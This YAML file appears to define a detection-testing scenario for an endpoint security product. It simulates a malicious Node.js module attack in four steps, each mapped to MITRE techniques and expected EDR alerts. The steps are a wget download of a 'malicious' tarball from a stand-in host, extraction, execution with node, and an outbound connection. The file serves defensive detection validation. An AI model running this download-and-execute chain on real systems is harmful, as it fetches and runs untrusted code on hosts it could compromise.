success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected

  XDR BIOC / XQL detections, and the mean time from signal emit to alert

  creation is within the MTTD budget. Each step''s expected_detections row is

  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
steps:
- id: step-01
  name: Download malicious Node.js module
  command: wget -O /tmp/attack/node_module.tar.gz https://example.com/malicious_node_module.tar.gz
  identity: www-data
  mitre_technique: T1566.001
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Uncommon Node.js package initiated communication
    ttp_ref: TTP-2026-0449
    detection_id: abioc-uncommon-node-js-package-initiated-communication
- id: step-02
  name: Extract malicious Node.js module
  command: tar -xzf /tmp/attack/node_module.tar.gz -C /tmp/attack/node_modules
  identity: www-data
  mitre_technique: T1059.008
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Uncommon Node.js package initiated communication
    ttp_ref: TTP-2026-0449
    detection_id: abioc-uncommon-node-js-package-initiated-communication
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Execute malicious Node.js script
  command: node /tmp/attack/node_modules/malicious_script.js
  identity: www-data
  mitre_technique: T1059.008
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Uncommon Node.js package initiated communication
    ttp_ref: TTP-2026-0449
    detection_id: abioc-uncommon-node-js-package-initiated-communication
  causality:
    parent_step: step-02
    pivot: process_lineage
- id: step-04
  name: Initiate outbound network connection
  command: node /tmp/attack/node_modules/malicious_script.js
  identity: www-data
  mitre_technique: T1071.004
  expected_detections:
  - plane: EDR
    type: ABIOC
    description: Uncommon Node.js package initiated communication
    ttp_ref: TTP-2026-0449
    detection_id: abioc-uncommon-node-js-package-initiated-communication
  causality:
    parent_step: step-03
    pivot: process_lineage
cleanup:
  commands:
  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
